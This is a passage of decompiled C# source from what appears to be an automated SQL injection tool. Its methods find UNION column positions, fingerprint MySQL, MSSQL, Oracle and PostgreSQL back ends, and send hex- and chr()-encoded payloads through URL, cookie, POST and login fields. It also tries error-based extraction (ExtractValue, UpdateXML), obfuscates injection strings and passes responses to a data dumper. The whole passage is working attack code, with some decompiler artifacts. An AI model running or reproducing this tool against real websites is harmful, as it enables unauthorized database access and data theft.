    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return flag1;
  }

  private void TryUnionBasead(List<string> lTraject, List<string> lUnions)
  {
    try
    {
      int num1 = checked (this.__UnionEnd - this.__UnionStart + 1);
      string str1 = "";
      if (this.SQLType == Types.Unknown | this.SQLType == Types.None)
      {
        int num2 = checked (lTraject.Count - 1);
        int index = 0;
        while (index <= num2)
        {
          this.SQLType = this.CheckTypeDB(lTraject[index]);
          if (this.SQLType == Types.Unknown | this.SQLType == Types.None)
            checked { ++index; }
          else
            break;
        }
      }
      int num3 = checked (num1 * lUnions.Count * lTraject.Count);
      if (this.__CheckUnionInteger & this.__CheckUnionKeyword)
        checked { num3 *= 2; }
      this.__ThreadPoolAnalizer = new ThreadPool(num3 <= this.__Threads ? num3 : this.__Threads);
      if (Utls.TypeIsOracle(this.SQLType) | Utls.TypeIsPostgreSQL(this.SQLType))
      {
        this.__CheckUnionInteger = false;
        this.__CheckUnionKeyword = true;
      }
      int num4 = 0;
      do
      {
        switch (num4)
        {
          case 0:
            if (this.__CheckUnionInteger)
              goto default;
            else
              break;
          case 1:
            if (!this.__CheckUnionKeyword)
              break;
            goto default;
          default:
            int num2 = checked (lTraject.Count - 1);
            int index1 = 0;
            while (index1 <= num2)
            {
              this.__RetryExceded = false;
              if (this.__CheckErrorPoints)
              {
                this.SQLType = this.CheckTypeDB(lTraject[index1]);
                if (this.SQLType == Types.None)
                  goto label_36;
              }
              int num5 = checked (lUnions.Count - 1);
              int index2 = 0;
              while (index2 <= num5)
              {
                int unionStart = this.__UnionStart;
                int unionEnd = this.__UnionEnd;
                int num6 = unionStart;
                while (num6 <= unionEnd)
                {
                  if (this.PausedOrCanceled())
                    this.__ThreadPoolAnalizer.AbortThreads();
                  if (!(this.UnionFound() | this.PausedOrCanceled()))
                  {
                    Thread thread = num4 != 0 ? new Thread((ParameterizedThreadStart) (a0 => this.TryUnionPositionKeyword((Analizer.ThreadControl) a0))) : new Thread((ParameterizedThreadStart) (a0 => this.TryUnionPosition((Analizer.ThreadControl) a0)));
                    int num7;
                    thread.Name = "Pos : " + Conversions.ToString(num7);
                    Analizer.ThreadControl threadControl = new Analizer.ThreadControl();
                    threadControl.Thread = thread;
                    threadControl.UnionString = lUnions[index2];
                    threadControl.Traject = lTraject[index1];
                    threadControl.UnionPostion = num6;
                    if (Utls.TypeIsOracle(this.SQLType) && !threadControl.UnionString.ToLower().Contains("dual".ToLower()))
                      threadControl.UnionString = threadControl.UnionString.Replace("[t]", "[t] from dual");
                    if (num4 == 1)
                    {
                      if (string.IsNullOrEmpty(str1))
                        str1 = this.FindKeyword(threadControl.Traject);
                      if (!string.IsNullOrEmpty(str1))
                        threadControl.Keyword = str1;
                      else
                        break;
                    }
                    thread.Start((object) threadControl);
                    this.__ThreadPoolAnalizer.Open(thread);
                    string str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Interaction.IIf((lTraject.Count > 1 ? 1 : 0) != 0, (object) ("Position: " + Conversions.ToString(checked (index1 + 1)) + "/" + Conversions.ToString(lTraject.Count) + " "), (object) ""), Interaction.IIf((lUnions.Count > 1 ? 1 : 0) != 0, (object) ("Union Sytle: " + Conversions.ToString(checked (index2 + 1)) + "/" + Conversions.ToString(lUnions.Count) + " "), (object) "")), (object) "Union Position: "), (object) num6), (object) "/"), (object) this.__UnionEnd));
                    int iPerc = checked ((int) Math.Round(Math.Round(unchecked ((double) checked (100 * num7) / (double) num3))));
                    if (num4 == 0)
                    {
                      Analizer.OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
                      if (onProgressEvent != null)
                        onProgressEvent("Analizer thread, trying Union Integer, " + str2, iPerc, this);
                    }
                    else if (num4 == 1)
                    {
                      Analizer.OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
                      if (onProgressEvent != null)
                        onProgressEvent("Analizer thread, trying Union Keyword, " + str2, iPerc, this);
                    }
                    this.__ThreadPoolAnalizer.WaitForThreads();
                    checked { ++num7; }
                    checked { ++num6; }
                  }
                  else
                    goto label_44;
                }
                checked { ++index2; }
              }
label_36:
              checked { ++index1; }
            }
            break;
        }
        checked { ++num4; }
      }
      while (num4 <= 1);
label_44:
      while (this.__ThreadPoolAnalizer.Status != ThreadPool.ThreadStatus.Stopped)
      {
        if (!this.PausedOrCanceled())
        {
          if (this.__ThreadPoolAnalizer.ThreadCount != 0)
            Thread.Sleep(200);
          else
            break;
        }
        else
        {
          if (this.__ThreadPoolAnalizer.ThreadCount > 0)
          {
            this.__ThreadPoolAnalizer.AbortThreads();
            break;
          }
          break;
        }
      }
      if (!this.UnionFound())
        return;
      bool flag = true;
      if (Utls.TypeIsMySQL(this.SQLType))
        this.SQLType = Types.MySQL_No_Error;
      else if (flag == Utls.TypeIsMSSQL(this.SQLType))
        this.SQLType = Types.MSSQL_No_Error;
      else if (flag == Utls.TypeIsOracle(this.SQLType))
        this.SQLType = Types.Oracle_No_Error;
      else if (flag == Utls.TypeIsPostgreSQL(this.SQLType))
        this.SQLType = Types.PostgreSQL_No_Error;
      this.Result = InjectionType.Union;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void TryUnionPosition(Analizer.ThreadControl t)
  {
    try
    {
      string newValue1 = "";
      string sText = "913514562";
      int unionPostion1 = t.UnionPostion;
      int num1 = 1;
      while (num1 <= unionPostion1)
      {
        if (!string.IsNullOrEmpty(newValue1))
          newValue1 += ",";
        if (Utls.TypeIsMySQL(this.SQLType))
          newValue1 += Globals.G_Utilities.ConvertTextToHex(sText + Conversions.ToString(num1) + ".9");
        else if (Utls.TypeIsMSSQL(this.SQLType))
          newValue1 = newValue1 + "cast(" + Globals.G_Utilities.ConvertTextToHex(sText + Conversions.ToString(num1) + ".9") + "+as+char)";
        else if (Utls.TypeIsOracle(this.SQLType))
          newValue1 += Globals.G_Utilities.ConvertTextToSQLChar(sText, false, "||", "chr");
        else if (Utls.TypeIsPostgreSQL(this.SQLType))
        {
          newValue1 = Globals.G_Utilities.ConvertTextToSQLChar(sText + Conversions.ToString(num1) + ".9", false, "||", "chr");
        }
        else
        {
          if (this.__CheckErrorPoints)
            return;
          newValue1 = !this.URL.ToLower().Contains(".php".ToLower()) ? newValue1 + "cast(" + Globals.G_Utilities.ConvertTextToHex(sText + Conversions.ToString(num1) + ".9") + "+as+char)" : newValue1 + Globals.G_Utilities.ConvertTextToHex(sText + Conversions.ToString(num1) + ".9");
        }
        checked { ++num1; }
      }
      string str1 = t.Traject.Replace("[t]", t.UnionString.Replace("[t]", newValue1));
      Analizer.HTMLParams p = new Analizer.HTMLParams();
      p.URL = this.URL;
      p.Cookies = this.Cookies;
      p.POST = this.POST;
      p.LoginUser = this.LoginUser;
      p.LoginPassword = this.LoginPassword;
      switch (this.__InjectionPoint)
      {
        case Analizer.InjectionPoint.URL:
          p.URL = str1;
          break;
        case Analizer.InjectionPoint.Cookies:
          p.Cookies = str1;
          break;
        case Analizer.InjectionPoint.POST:
          p.POST = str1;
          break;
        case Analizer.InjectionPoint.LoginUser:
          p.LoginUser = str1;
          break;
        case Analizer.InjectionPoint.LoginPassword:
          p.LoginPassword = str1;
          break;
      }
      string str2 = this.LoadHTML(p);
      if (this.UnionFound())
        return;
      if (!str2.ToLower().Contains(sText.ToLower()))
        return;
      int integer;
      try
      {
        string str3 = str2.Substring(str2.ToLower().IndexOf(sText.ToLower()));
        string str4 = str3.Substring(sText.Length, checked (str3.IndexOf(".") - sText.Length));
        lock (this)
        {
          if (Versioned.IsNumeric((object) str4))
            integer = Conversions.ToInteger(str4);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string newValue2 = "";
      int unionPostion2 = t.UnionPostion;
      int num2 = 1;
      while (num2 <= unionPostion2)
      {
        if (!string.IsNullOrEmpty(newValue2))
          newValue2 += ",";
        newValue2 = !(num2 == integer & integer > 0) ? newValue2 + Conversions.ToString(num2) : newValue2 + "[t]";
        checked { ++num2; }
      }
      string sTraject = t.Traject.Replace("[t]", t.UnionString.Replace("[t]", newValue2));
      if (integer <= 0 || !this.TestUnion(sTraject))
        return;
      this.UnionString = integer;
      this.UnionCount = t.UnionPostion;
      this.InjectQuery = sTraject;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    finally
    {
      try
      {
        this.__ThreadPoolAnalizer.Close(t.Thread);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void TryUnionPositionKeyword(Analizer.ThreadControl t)
  {
    try
    {
      string newValue1 = "";
      string str1 = "ABC145ZQ62DWQAFPOIYCFD";
      string str2 = !Utls.TypeIsOracle(this.SQLType) || t.UnionString.ToLower().Contains("dual".ToLower()) ? t.UnionString : t.UnionString.Replace("[t]", "[t] from dual");
      int unionPostion1 = t.UnionPostion;
      int num1 = 1;
      while (num1 <= unionPostion1)
      {
        if (!string.IsNullOrEmpty(newValue1))
          newValue1 += ",";
        newValue1 += "null";
        checked { ++num1; }
      }
      string str3 = t.Traject.Replace("[t]", str2.Replace("[t]", newValue1));
      Analizer.HTMLParams p1 = new Analizer.HTMLParams();
      p1.URL = this.URL;
      p1.Cookies = this.Cookies;
      p1.POST = this.POST;
      p1.LoginUser = this.LoginUser;
      p1.LoginPassword = this.LoginPassword;
      switch (this.__InjectionPoint)
      {
        case Analizer.InjectionPoint.URL:
          p1.URL = str3;
          break;
        case Analizer.InjectionPoint.Cookies:
          p1.Cookies = str3;
          break;
        case Analizer.InjectionPoint.POST:
          p1.POST = str3;
          break;
        case Analizer.InjectionPoint.LoginUser:
          p1.LoginUser = str3;
          break;
        case Analizer.InjectionPoint.LoginPassword:
          p1.LoginPassword = str3;
          break;
      }
      string str4 = this.LoadHTML(p1);
      if (this.UnionFound() || !str4.ToLower().Contains(t.Keyword.ToLower()))
        return;
      if (!(this.SQLType == Types.Unknown | this.SQLType == Types.None))
      {
        int num2 = 1;
        int unionPostion2 = t.UnionPostion;
        int num3 = 1;
        while (num3 <= unionPostion2)
        {
          string newValue2 = "";
          int unionPostion3 = t.UnionPostion;
          int num4 = 1;
          while (num4 <= unionPostion3)
          {
            if (!string.IsNullOrEmpty(newValue2))
              newValue2 += ",";
            newValue2 = num4 != num2 ? newValue2 + "null" : newValue2 + "[t]";
            checked { ++num4; }
          }
          Analizer.HTMLParams p2 = new Analizer.HTMLParams();
          p2.URL = this.URL;
          p2.Cookies = this.Cookies;
          p2.POST = this.POST;
          p2.LoginUser = this.LoginUser;
          p2.LoginPassword = this.LoginPassword;
          string str5 = t.Traject.Replace("[t]", str2.Replace("[t]", newValue2));
          string str6;
          if (Utls.TypeIsMySQL(this.SQLType))
            str6 = str5.Replace("[t]", Globals.G_Utilities.ConvertTextToHex(str1));
          else if (Utls.TypeIsMSSQL(this.SQLType))
            str6 = str5.Replace("[t]", Globals.G_Utilities.ConvertTextToSQLChar(str1, false));
          else if (Utls.TypeIsOracle(this.SQLType))
            str6 = str5.Replace("[t]", Globals.G_Utilities.ConvertTextToSQLChar(str1, false, "||", "chr"));
          else if (Utls.TypeIsPostgreSQL(this.SQLType))
          {
            str6 = str5.Replace("[t]", Globals.G_Utilities.ConvertTextToSQLChar(str1, false, "||", "chr"));
          }
          else
          {
            if (this.__CheckErrorPoints)
              return;
            str6 = str5.Replace("[t]", str1);
          }
          switch (this.__InjectionPoint)
          {
            case Analizer.InjectionPoint.URL:
              p2.URL = str6;
              break;
            case Analizer.InjectionPoint.Cookies:
              p2.Cookies = str6;
              break;
            case Analizer.InjectionPoint.POST:
              p2.POST = str6;
              break;
            case Analizer.InjectionPoint.LoginUser:
              p2.LoginUser = str6;
              break;
            case Analizer.InjectionPoint.LoginPassword:
              p2.LoginPassword = str6;
              break;
          }
          if (this.LoadHTML(p2).ToLower().Contains(str1.ToLower()))
          {
            string newValue3 = "";
            int unionPostion4 = t.UnionPostion;
            int num5 = 1;
            while (num5 <= unionPostion4)
            {
              if (!string.IsNullOrEmpty(newValue3))
                newValue3 += ",";
              newValue3 = num5 != num2 ? newValue3 + "null" : newValue3 + "[t]";
              checked { ++num5; }
            }
            string sTraject = t.Traject.Replace("[t]", str2.Replace("[t]", newValue3));
            if (this.TestUnion(sTraject))
            {
              this.InjectQuery = sTraject;
              this.UnionCount = t.UnionPostion;
              this.UnionString = num2;
              break;
            }
          }
          int num6;
          checked { ++num6; }
          checked { ++num2; }
          if (this.PausedOrCanceled() || num6 > 3)
            return;
          checked { ++num3; }
        }
      }
      if (this.UnionString != 0)
        ;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    finally
    {
      try
      {
        this.__ThreadPoolAnalizer.Close(t.Thread);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  private bool TestUnion(string sTraject)
  {
    try
    {
      if (this.UnionString > 0)
      {
        Analizer.OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
        if (onProgressEvent != null)
          onProgressEvent("Analizer thread, Testing Union (Column: " + Conversions.ToString(this.UnionString) + " Count: " + Conversions.ToString(this.UnionCount) + ")", -1, this);
      }
      if (this.SQLType == Types.None | this.SQLType == Types.Unknown)
      {
        int num = 0;
label_11:
        Types types = Types.MySQL_Unknown;
        while (!this.CheckCollactions(sTraject, InjectionType.Union, types))
        {
          checked { ++num; }
          if (num <= 3)
          {
            switch (num)
            {
              case 0:
                goto label_11;
              case 1:
                types = Types.MSSQL_Unknown;
                continue;
              case 2:
                types = Types.Oracle_Unknown;
                continue;
              case 3:
                types = Types.PostgreSQL_Unknown;
                continue;
              default:
                continue;
            }
          }
          else
            goto label_33;
        }
        bool flag = true;
        if (Utls.TypeIsOracle(types))
          this.SQLType = Types.Oracle_No_Error;
        else if (flag == Utls.TypeIsPostgreSQL(types))
          this.SQLType = Types.PostgreSQL_No_Error;
        else if (flag == Utls.TypeIsMySQL(types))
          this.SQLType = Types.MySQL_No_Error;
        else if (flag == Utls.TypeIsMSSQL(types))
          this.SQLType = Types.MSSQL_No_Error;
        return true;
      }
      if (!this.CheckCollactions(sTraject, InjectionType.Union, this.SQLType))
        return false;
      bool flag1 = true;
      if (Utls.TypeIsMySQL(this.SQLType))
        this.SQLType = Types.MySQL_No_Error;
      else if (flag1 == Utls.TypeIsMSSQL(this.SQLType))
        this.SQLType = Types.MSSQL_No_Error;
      else if (flag1 == Utls.TypeIsOracle(this.SQLType))
        this.SQLType = Types.Oracle_No_Error;
      else if (flag1 == Utls.TypeIsPostgreSQL(this.SQLType))
        this.SQLType = Types.PostgreSQL_No_Error;
      return true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
label_33:
    bool flag2;
    return flag2;
  }

  private bool CheckCollactions(string sTraject, InjectionType oType, Types oSQL)
  {
    bool flag1;
    try
    {
      string sData = "";
      List<string> lColumn = new List<string>();
      bool flag2 = true;
      if (Utls.TypeIsMySQL(oSQL))
        lColumn.Add("version()");
      else if (flag2 == Utls.TypeIsMSSQL(oSQL))
        lColumn.Add("@@version");
      else if (flag2 == Utls.TypeIsOracle(oSQL))
      {
        lColumn.Add("(select user from dual)");
      }
      else
      {
        if (flag2 != Utls.TypeIsPostgreSQL(oSQL))
          return false;
        lColumn.Add("version()");
      }
      if (oType == InjectionType.Error && Utls.TypeIsOracle(oSQL))
        this.OracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
      while (true)
      {
        bool flag3 = true;
        int num;
        if (!Utls.TypeIsMySQL(oSQL))
        {
          if (flag3 == Utls.TypeIsMSSQL(oSQL))
          {
            switch (num)
            {
              case 0:
                sData = MSSQL.Info(sTraject, oType, this.MSSQLCollate, lColumn, "char");
                this.MSSQLCast = "char";
                break;
              case 1:
                sData = MSSQL.Info(sTraject, oType, this.MSSQLCollate, lColumn, "");
                this.MSSQLCast = "";
                break;
              case 2:
                sData = MSSQL.Info(sTraject, oType, this.MSSQLCollate, lColumn, "nvarchar");
                this.MSSQLCast = "nvarchar";
                break;
              case 3:
                this.MSSQLCollate = false;
                sData = MSSQL.Info(sTraject, oType, this.MSSQLCollate, lColumn, "char");
                this.MSSQLCast = "char";
                break;
              case 4:
                sData = MSSQL.Info(sTraject, oType, this.MSSQLCollate, lColumn, "");
                this.MSSQLCast = "";
                break;
              default:
                goto label_80;
            }
          }
          else if (flag3 == Utls.TypeIsOracle(oSQL))
          {
            switch (num)
            {
              case 0:
                sData = Oracle.Info(sTraject, oType, this.OracleErrorType, lColumn, this.OracleCast);
                break;
              case 1:
                this.OracleCast = !this.OracleCast;
                sData = Oracle.Info(sTraject, oType, this.OracleErrorType, lColumn, this.OracleCast);
                break;
              default:
                goto label_80;
            }
          }
          else if (flag3 == Utls.TypeIsPostgreSQL(oSQL))
          {
            if (oType == InjectionType.Union)
            {
              if (num == 0)
                sData = PostgreSQL.Info(sTraject, oType, PostgreSQLErrorType.NONE, lColumn);
              else
                break;
            }
            else if (num == 0)
              sData = PostgreSQL.Info(sTraject, oType, PostgreSQLErrorType.CAST_INT, lColumn);
            else
              break;
          }
        }
        else
          goto label_54;
label_27:
        Analizer.HTMLParams p = new Analizer.HTMLParams();
        p.URL = this.URL;
        p.Cookies = this.Cookies;
        p.POST = this.POST;
        p.LoginUser = this.LoginUser;
        p.LoginPassword = this.LoginPassword;
        switch (this.__InjectionPoint)
        {
          case Analizer.InjectionPoint.URL:
            p.URL = sData;
            break;
          case Analizer.InjectionPoint.Cookies:
            p.Cookies = sData;
            break;
          case Analizer.InjectionPoint.POST:
            p.POST = sData;
            break;
          case Analizer.InjectionPoint.LoginUser:
            p.LoginUser = sData;
            break;
          case Analizer.InjectionPoint.LoginPassword:
            p.LoginPassword = sData;
            break;
        }
        sData = this.LoadHTML(p);
        if (!string.IsNullOrEmpty(sData))
        {
          List<string> stringList = new List<string>();
          switch (oType)
          {
            case InjectionType.Union:
              bool flag4 = true;
              if (Utls.TypeIsMySQL(oSQL))
              {
                stringList = Globals.G_Dumper.ParseHtmlData(sData, Types.MySQL_No_Error);
                break;
              }
              if (flag4 == Utls.TypeIsMSSQL(oSQL))
              {
                stringList = Globals.G_Dumper.ParseHtmlData(sData, Types.MSSQL_No_Error);
                break;
              }
              if (flag4 == Utls.TypeIsOracle(oSQL))
              {
                stringList = Globals.G_Dumper.ParseHtmlData(sData, Types.Oracle_No_Error);
                break;
              }
              if (flag4 == Utls.TypeIsPostgreSQL(oSQL))
              {
                stringList = Globals.G_Dumper.ParseHtmlData(sData, Types.PostgreSQL_No_Error);
                break;
              }
              break;
            case InjectionType.Error:
              bool flag5 = true;
              if (Utls.TypeIsMySQL(oSQL))
              {
                stringList = Globals.G_Dumper.ParseHtmlData(sData, Types.MySQL_With_Error);
                break;
              }
              if (flag5 == Utls.TypeIsMSSQL(oSQL))
              {
                stringList = Globals.G_Dumper.ParseHtmlData(sData, Types.MSSQL_With_Error);
                break;
              }
              if (flag5 == Utls.TypeIsOracle(oSQL))
              {
                stringList = Globals.G_Dumper.ParseHtmlData(sData, Types.Oracle_With_Error);
                break;
              }
              if (flag5 == Utls.TypeIsPostgreSQL(oSQL))
              {
                stringList = Globals.G_Dumper.ParseHtmlData(sData, Types.PostgreSQL_With_Error);
                break;
              }
              break;
          }
          flag1 = stringList.Count > 0;
          if (!this.PausedOrCanceled())
          {
            if (!flag1)
            {
              checked { ++num; }
              continue;
            }
            break;
          }
          break;
        }
        break;
label_54:
        if (oType == InjectionType.Union)
        {
          switch (num)
          {
            case 0:
              sData = MySQLNoError.Info(sTraject, MySQLCollactions.None, false, lColumn);
              this.MySQLCollactions = MySQLCollactions.None;
              goto label_27;
            case 1:
              sData = MySQLNoError.Info(sTraject, MySQLCollactions.UnHex, false, lColumn);
              this.MySQLCollactions = MySQLCollactions.UnHex;
              goto label_27;
            case 2:
              sData = MySQLNoError.Info(sTraject, MySQLCollactions.Binary, false, lColumn);
              this.MySQLCollactions = MySQLCollactions.Binary;
              goto label_27;
            case 3:
              sData = MySQLNoError.Info(sTraject, MySQLCollactions.CastAsChar, false, lColumn);
              this.MySQLCollactions = MySQLCollactions.CastAsChar;
              goto label_27;
            case 4:
              sData = MySQLNoError.Info(sTraject, MySQLCollactions.Compress, false, lColumn);
              this.MySQLCollactions = MySQLCollactions.Compress;
              goto label_27;
            case 5:
              sData = MySQLNoError.Info(sTraject, MySQLCollactions.ConvertUtf8, false, lColumn);
              this.MySQLCollactions = MySQLCollactions.ConvertUtf8;
              goto label_27;
            case 6:
              sData = MySQLNoError.Info(sTraject, MySQLCollactions.ConvertLatin1, false, lColumn);
              this.MySQLCollactions = MySQLCollactions.ConvertLatin1;
              goto label_27;
            case 7:
              sData = MySQLNoError.Info(sTraject, MySQLCollactions.Aes_descrypt, false, lColumn);
              this.MySQLCollactions = MySQLCollactions.Aes_descrypt;
              goto label_27;
            default:
              goto label_80;
          }
        }
        else
        {
          if (num > 7 & !this.__IsFullAnalized)
          {
            switch (this.MySQLErrorType)
            {
              case MySQLErrorType.DuplicateEntry:
                this.MySQLErrorType = MySQLErrorType.ExtractValue;
                break;
              case MySQLErrorType.ExtractValue:
                this.MySQLErrorType = MySQLErrorType.UpdateXML;
                break;
              case MySQLErrorType.UpdateXML:
                goto label_80;
            }
          }
          switch (num)
          {
            case 0:
              sData = MySQLWithError.Info(sTraject, MySQLCollactions.None, this.MySQLErrorType, lColumn);
              this.MySQLCollactions = MySQLCollactions.None;
              goto label_27;
            case 1:
              sData = MySQLWithError.Info(sTraject, MySQLCollactions.UnHex, this.MySQLErrorType, lColumn);
              this.MySQLCollactions = MySQLCollactions.UnHex;
              goto label_27;
            case 2:
              sData = MySQLWithError.Info(sTraject, MySQLCollactions.Binary, this.MySQLErrorType, lColumn);
              this.MySQLCollactions = MySQLCollactions.Binary;
              goto label_27;
            case 3:
              sData = MySQLWithError.Info(sTraject, MySQLCollactions.CastAsChar, this.MySQLErrorType, lColumn);
              this.MySQLCollactions = MySQLCollactions.CastAsChar;
              goto label_27;
            case 4:
              sData = MySQLWithError.Info(sTraject, MySQLCollactions.Compress, this.MySQLErrorType, lColumn);
              this.MySQLCollactions = MySQLCollactions.Compress;
              goto label_27;
            case 5:
              sData = MySQLWithError.Info(sTraject, MySQLCollactions.ConvertUtf8, this.MySQLErrorType, lColumn);
              this.MySQLCollactions = MySQLCollactions.ConvertUtf8;
              goto label_27;
            case 6:
              sData = MySQLWithError.Info(sTraject, MySQLCollactions.ConvertLatin1, this.MySQLErrorType, lColumn);
              this.MySQLCollactions = MySQLCollactions.ConvertLatin1;
              goto label_27;
            case 7:
              sData = MySQLWithError.Info(sTraject, MySQLCollactions.Aes_descrypt, this.MySQLErrorType, lColumn);
              this.MySQLCollactions = MySQLCollactions.Aes_descrypt;
              goto label_27;
            default:
              goto label_80;
          }
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
label_80:
    return flag1;
  }

  private Types CheckTypeDB(string sTraject)
  {
    Analizer.HTMLParams p = new Analizer.HTMLParams();
    p.URL = this.URL;
    p.Cookies = this.Cookies;
    p.POST = this.POST;
    p.LoginUser = this.LoginUser;
    p.LoginPassword = this.LoginPassword;
    sTraject = sTraject.Replace(" and [t]", "'0=A");
    sTraject = sTraject.Replace("[t]", "'0=A");
    switch (this.__InjectionPoint)
    {
      case Analizer.InjectionPoint.URL:
        p.URL = sTraject;
        break;
      case Analizer.InjectionPoint.Cookies:
        p.Cookies = sTraject;
        break;
      case Analizer.InjectionPoint.POST:
        p.POST = sTraject;
        break;
      case Analizer.InjectionPoint.LoginUser:
        p.LoginUser = sTraject;
        break;
      case Analizer.InjectionPoint.LoginPassword:
        p.LoginPassword = sTraject;
        break;
    }
    return Utls.CheckSyntaxError(this.LoadHTML(p));
  }

  private bool UnionFound()
  {
    bool flag;
    lock (this)
    {
      if (this.UnionString > 0)
        flag = true;
      else if (this.UnionCount > 0)
      {
        if (this.SQLType == Types.Unknown | this.SQLType == Types.None)
          flag = true;
      }
    }
    return flag;
  }

  private void CheckRequestDelay()
  {
    bool lockTaken = false;
    try
    {
      Monitor.Enter((object) this..STATIC.CheckRequestDelay.2001.LastTick.Init, ref lockTaken);
      if (this..STATIC.CheckRequestDelay.2001.LastTick.Init.State == (short) 0)
      {
        this..STATIC.CheckRequestDelay.2001.LastTick.Init.State = (short) 2;
        this..STATIC.CheckRequestDelay.2001.LastTick = 1L;
      }
      else if (this..STATIC.CheckRequestDelay.2001.LastTick.Init.State == (short) 2)
        throw new IncompleteInitialization();
    }
    finally
    {
      this..STATIC.CheckRequestDelay.2001.LastTick.Init.State = (short) 1;
      if (lockTaken)
        Monitor.Exit((object) this..STATIC.CheckRequestDelay.2001.LastTick.Init);
    }
    if (this.__Delay == 0)
      return;
    while (checked ((long) Math.Round(unchecked ((double) DateTime.UtcNow.Ticks / 10000.0)) - this..STATIC.CheckRequestDelay.2001.LastTick) <= (long) this.__Delay)
      Thread.Sleep(50);
    this..STATIC.CheckRequestDelay.2001.LastTick = checked ((long) Math.Round(unchecked ((double) DateTime.UtcNow.Ticks / 10000.0)));
  }

  private bool PausedOrCanceled()
  {
    bool flag;
    lock (this)
    {
      if (this.UnionString > 0 && this.Running)
      {
        flag = true;
        goto label_16;
      }
      else if (!this.__Cancel)
      {
        lock (this)
        {
          if (this.__RetryExceded)
          {
            flag = true;
            goto label_16;
          }
        }
      }
      else
      {
        flag = true;
        goto label_16;
      }
    }
    while (this.__Paused)
      Thread.Sleep(100);
label_16:
    return flag;
  }

  private string FindKeyword(string sMainTraject)
  {
    Analizer.OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
    if (onProgressEvent != null)
      onProgressEvent("Analizer thread, finding keyword..", -1, this);
    string str1 = "";
    string[] strArray = new string[2];
    List<string>[] stringListArray = new List<string>[2];
    List<string> stringList = new List<string>();
    stringList.AddRange((IEnumerable<string>) Strings.Split(sMainTraject, "/"));
    stringList.AddRange((IEnumerable<string>) Strings.Split(sMainTraject, "&"));
    stringList.AddRange((IEnumerable<string>) Strings.Split(sMainTraject, "="));
    int index = 0;
    do
    {
      Analizer.HTMLParams p = new Analizer.HTMLParams();
      p.URL = this.URL;
      p.Cookies = this.Cookies;
      p.POST = this.POST;
      p.LoginUser = this.LoginUser;
      p.LoginPassword = this.LoginPassword;
      string str2;
      string str3;
      if (index != 0)
      {
        str2 = sMainTraject.Replace(" and [t]", "'0=A");
        str3 = sMainTraject.Replace("[t]", "'0=A");
      }
      else
        goto label_30;
label_5:
      if (index > 0 | this.URL.Contains("[t]"))
      {
        switch (this.__InjectionPoint)
        {
          case Analizer.InjectionPoint.URL:
            p.URL = str3;
            break;
          case Analizer.InjectionPoint.Cookies:
            p.Cookies = str3;
            break;
          case Analizer.InjectionPoint.POST:
            p.POST = str3;
            break;
          case Analizer.InjectionPoint.LoginUser:
            p.LoginUser = str3;
            break;
          case Analizer.InjectionPoint.LoginPassword:
            p.LoginPassword = str3;
            break;
        }
      }
      strArray[index] = this.LoadHTML(p);
      stringListArray[index] = new List<string>();
      if (string.IsNullOrEmpty(strArray[index]))
      {
        if (string.IsNullOrEmpty(str1))
          this.__RetryExceded = false;
        else
          goto label_32;
      }
      else
      {
        stringListArray[index].AddRange((IEnumerable<string>) Strings.Split(strArray[index].Trim()));
        if (index == 1)
        {
          if (!(stringListArray[0].Count == 0 & stringListArray[1].Count == 0))
          {
            if (stringListArray[0].Count == 0)
            {
              stringListArray[0].AddRange((IEnumerable<string>) stringListArray[1].ToArray());
              stringListArray[1].Clear();
            }
            try
            {
              foreach (string str4 in stringListArray[0])
              {
                string str5 = str4.Trim();
                if (!string.IsNullOrEmpty(str5) && str5.Length > 5 && !stringListArray[1].Contains(str5))
                {
                  if (string.IsNullOrEmpty(str1))
                  {
                    bool flag;
                    try
                    {
                      foreach (string str6 in stringList)
                      {
                        if (!(flag = !str5.Contains(str6) | string.IsNullOrEmpty(str6)))
                          break;
                      }
                    }
                    finally
                    {
                      List<string>.Enumerator enumerator;
                      enumerator.Dispose();
                    }
                    if (flag)
                    {
                      str1 = str5;
                      if (str5.Length > 5)
                        break;
                    }
                  }
                }
              }
            }
            finally
            {
              List<string>.Enumerator enumerator;
              enumerator.Dispose();
            }
          }
          else
            goto label_33;
        }
      }
      checked { ++index; }
      continue;
label_30:
      str2 = sMainTraject.Replace(" and [t]", "null");
      str3 = sMainTraject.Replace("[t]", "null");
      goto label_5;
    }
    while (index <= 1);
    goto label_34;
label_32:
    return str1;
label_33:
    return "";
label_34:
    return str1;
  }

  private string LoadHTML(Analizer.HTMLParams p)
  {
    string str1 = string.Empty;
    switch (this.__InjectionPoint)
    {
      case Analizer.InjectionPoint.URL:
        Globals.G_Tools.CheckSQLiStringOfuscation(ref p.URL);
        break;
      case Analizer.InjectionPoint.Cookies:
        Globals.G_Tools.CheckSQLiStringOfuscation(ref p.Cookies);
        break;
      case Analizer.InjectionPoint.POST:
        Globals.G_Tools.CheckSQLiStringOfuscation(ref p.POST);
        break;
      case Analizer.InjectionPoint.LoginUser:
        Globals.G_Tools.CheckSQLiStringOfuscation(ref p.LoginUser);
        break;
      case Analizer.InjectionPoint.LoginPassword:
        Globals.G_Tools.CheckSQLiStringOfuscation(ref p.LoginPassword);
        break;
    }
    using (HTTP http1 = new HTTP(this.__TimeOut))
    {
      NetworkCredential networkCredential = (NetworkCredential) null;
